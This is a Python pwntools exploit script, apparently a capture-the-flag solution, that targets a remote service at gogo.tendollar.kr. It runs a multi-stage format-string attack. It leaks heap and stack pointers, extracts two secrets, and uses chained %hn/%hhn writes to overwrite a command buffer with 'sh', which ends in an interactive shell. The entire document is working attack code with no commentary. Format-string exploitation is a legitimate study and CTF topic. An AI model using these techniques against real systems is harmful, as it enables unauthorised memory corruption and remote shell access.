from pwn import *


def main():
    t = remote("gogo.tendollar.kr", 12010)

    # stage 1: local variables
    t.sendline('%c%c%c%c%c%p%s//')
    output = t.recvuntil('//', drop=True)
    secret1 = output[-20:]

    p_heap = output[:-20].rsplit('0x', 1)[-1]
    p_heap = int(p_heap, 16)

    info(`secret1`)
    t.sendline(secret1)

    # stage 2: sfp chain
    t.recvuntil('Congratulations!')
    t.sendline('%c%c%c%c%c%p**')
    rbp2 = t.recvuntil('**', drop=True).rsplit('0x', 1)[-1]
    rbp2 = int(rbp2, 16)

    p_address = rbp2 + 0x10
    p_secret2 = p_heap + 0x90

    t.sendline('%c%c%c%c%c%c%{}c%hn##'.format((p_secret2 & 0xffff) - 6))
    t.recvuntil('##')

    p_address_next = (p_address + 2) & 0xff
    t.sendline('%c%c%c%c%{}c%hhn%{}c%hn##'.format(p_address_next - 4,
                                              ((p_secret2 >> 16) & 0xffff) - p_address_next))
    t.recvuntil('##')

    p_address_next = (p_address + 4) & 0xff
    t.sendline('%c%c%c%c%{}c%hhn%{}c%n##'.format(p_address_next - 4,
                                             ((p_secret2 >> 32) & 0xffff) - p_address_next))
    t.recvuntil('##')

    t.sendline('%c%c%c%c%c%c%c%c%c%s//')
    output = t.recvuntil('//', drop=True)
    secret2 = output[-32:]

    info(`secret2`)
    t.sendline(secret2)

    # stage 3: integer overflow
    t.recvuntil('Congratulations!')

    t.sendline('%{}c%10$hhn%12$p**'.format(0x100 - 0x41))
    output = t.recvuntil('**', drop=True)

    rbp2 = int(output.rsplit('0x', 1)[-1], 16)
    p_address = rbp2 + 0x10

    p_command = p_heap + 0x180 + 2
    p_command_next = p_command & 0xff

    t.sendline('%{}c%10$hhn%{}c%14$hhn##'.format(0x100 - 0x41, p_command_next))
    t.recvuntil('##')

    for i in range(1, 6):
        p_address_next = (p_address + i) & 0xff

        t.sendline('%{}c%10$hhn%{}c%12$hhn**'.format(0x100 - 0x41, p_address_next))
        t.recvuntil('**')

        p_command_next = p_command >> (i * 8)
        p_command_next &= 0xff

        t.sendline('%{}c%10$hhn%{}c%14$hhn##'.format(0x100 - 0x41, p_command_next))
        t.recvuntil('##')

    t.sendline('%{}c%10$hhn%16$hhn!!'.format(0x100 - 0x41))
    t.recvuntil('!!')

    p_command -= 2

    p_address_next = p_address & 0xff

    t.sendline('%{}c%10$hhn%{}c%12$hhn**'.format(0x100 - 0x41, p_address_next))
    t.recvuntil('**')

    p_command_next = p_command & 0xff

    t.sendline('%{}c%10$hhn%{}c%14$hhn##'.format(0x100 - 0x41, p_command_next))
    t.recvuntil('##')

    command = u16('sh') + 0x10000 - 0x3041
    t.sendline('%{}c%16$hn!!'.format(command))
    t.recvuntil('!!')

    t.interactive()


if __name__ == '__main__':
    main()

